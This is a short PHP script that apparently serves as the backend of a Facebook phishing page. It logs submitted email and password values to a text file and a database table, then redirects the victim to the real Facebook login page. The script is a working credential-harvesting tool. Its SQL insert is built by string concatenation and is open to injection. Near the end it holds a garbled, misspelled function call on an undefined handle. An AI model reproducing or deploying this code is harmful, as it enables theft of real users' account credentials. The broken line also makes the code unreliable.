<?php 
require_once 'connection.php';

header("Location: https://www.facebook.com/login.php");
$handle = fopen("clon.txt", "a");

foreach($_GET as $variable => $value)
{
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");

	if($variable=='email')
	{
		$emailBD=$value;
	}
	else
		if($variable=='pass')
		{
			$passwordBD=$value;
		}
}

$query = "INSERT INTO clon (email, password) VALUES('$emailBD', '$passwordBD')";
mysqli_query($db, $query); //Ejecuta el insert del email y password
	
frité($ande, "\r\n");
fclose($handle);
exit
?>